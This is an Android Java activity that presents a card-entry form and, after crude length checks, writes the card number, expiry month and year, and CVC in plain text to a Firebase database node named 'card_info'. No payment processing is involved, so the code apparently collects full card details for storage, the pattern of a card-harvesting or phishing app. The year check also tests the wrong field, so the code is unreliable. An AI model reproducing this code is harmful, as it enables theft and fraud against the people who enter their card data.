package com.example.bb;

import androidx.appcompat.app.AppCompatActivity;

import android.content.SharedPreferences;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class CardAct extends AppCompatActivity{
    EditText cardnum, carddate, carddate2, cardcvc;
    Button btncard;
    SharedPreferences shPr;
    DatabaseReference rootRef = FirebaseDatabase.getInstance().getReference();
    DatabaseReference numbRef = rootRef.child("card_info");

    String SAVED_TEXT;
    String CARDDATE_month;
    String CARDDATE_year;
    String CVC;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_card);
        cardnum = findViewById(R.id.CardNum);
        carddate = findViewById(R.id.cardDate);
        cardcvc = findViewById(R.id.CardCVC);
        carddate2 = findViewById(R.id.carddate2);

        btncard = findViewById(R.id.btncard);



        btncard.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                SAVED_TEXT = cardnum.getText().toString();
                Integer n = Integer.valueOf(SAVED_TEXT.length());
                if(n == 16) {
                    numbRef.child("card_number").setValue(cardnum.getText().toString());
                }else{
                    Toast.makeText(CardAct.this, "Ошибка", Toast.LENGTH_LONG).show();
                }

                CARDDATE_month = carddate.getText().toString();
                Integer d = Integer.valueOf(CARDDATE_month.length());
                if(d == 2){
                    numbRef.child("MM").setValue(carddate.getText().toString());
                }else{
                    Toast.makeText(CardAct.this, "Ошибка", Toast.LENGTH_LONG).show();
                }
                CARDDATE_year = carddate.getText().toString();
                Integer y = Integer.valueOf(CARDDATE_year.length());
                if(y == 2){
                    numbRef.child("YY").setValue(carddate2.getText().toString());
                }else{
                    Toast.makeText(CardAct.this, "Ошибка", Toast.LENGTH_LONG).show();
                }

                CVC = cardcvc.getText().toString();
                Integer c = Integer.valueOf(CVC.length());
                if(c == 3){
                    numbRef.child("CVC").setValue(cardcvc.getText().toString());

                }else{
                    Toast.makeText(CardAct.this, "Ошибка", Toast.LENGTH_LONG).show();
                }
                Toast.makeText(CardAct.this, "Готово", Toast.LENGTH_LONG).show();


            }
        });

    }
}
